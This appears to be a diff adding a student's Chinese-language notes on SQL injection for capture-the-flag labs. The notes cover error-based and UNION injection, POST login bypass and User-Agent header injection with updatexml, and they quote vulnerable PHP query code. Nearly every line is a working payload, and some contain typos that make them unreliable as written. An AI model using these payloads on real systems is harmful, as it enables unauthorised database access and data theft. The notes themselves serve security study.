@@ -1,0 +1,45 @@
+显错注入大概流程：
+1. 网址栏输入1=1 和1=2 观察是否错误 错误进入下一流程 正确改成其他情况
+2. order by 1，2，3等语句判断长度
+3.通过union select 1，2，3判断回显点 用database（） version（）等函数找
+4.按以下方法来进行
+
+方法一：union select 1,table_name from information_schema.tables where table_schema=database()  limit 0,1
+              union select 1,column_name form information_schema.columns where table_schema= database() and table_name='admin' limit 0,1
+	    union select 1,username form admin limit 0,1
+
+
+方法二：union select 1,group_concat(table_name) from information_schema.tables where table _schema =database()
+	   union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='error_flag'
+     	   union select 1,2,group_concat(id,flag) from error_flag  (此处可以把表中数据全都列出来)
+
+@$sql = 'select *from user where id='\''.$id.'\''; 
+最简单的用以上方法             以下是变形
+第一种有单引号                 '                 单引号要加在1的后面  最后要加--+
+第二种有单引号+小括号    ')                                                   最后要加--+
+第三种有双引号+小括号    ")                                                   最后要加--+
+
+POST注入大概流程
+$sql = 'select *from user where username =("'.$username.'") and password=("'.$password.'")';
+在用户名输入    ‘or 1=1 -- +      若成功登录  则有注入点；开始注入(最后其实什么符号都可以，因为post注入不编码)
+找长度              ' or 1=1 order by 1 -- +   依次进行；发现到第四时报错 则长
+注入找回显点    ' union select 1,2,3 -- +   发现 2 3 有回显
+开始找库名       ' union select 1,database(),version() -- + 得到为post_error
+' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- +
+得到 flag，
+' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag' #
+
+第二种是     ") or 1=1 #  有双引号和括号 剩下步骤同上；
+
+HEAD注入
+
+
+这段源码说明了
+if($row){                        //只有在数据库里查询到才可以执行以下代码
+$Insql = "INSERT INTO uagent (`uagent`,`username`) VALUES ('$uagent','$uname')";   //通过语句注入给ua和username的值，之后要通过单引号把uname的值给闭合掉
+$result1 = mysqli_query($conn,$Insql);
+print_r(mysqli_error($conn));
+echo '成功登录';
+
+
+抓包可以对ua进行修改，进行注入语句 ’ or updatexml（1，concat（‘~’，database（）），1），1）-- qwe  //这处三个右括号和四个左括号的原因是需要闭合上面代码里的括号
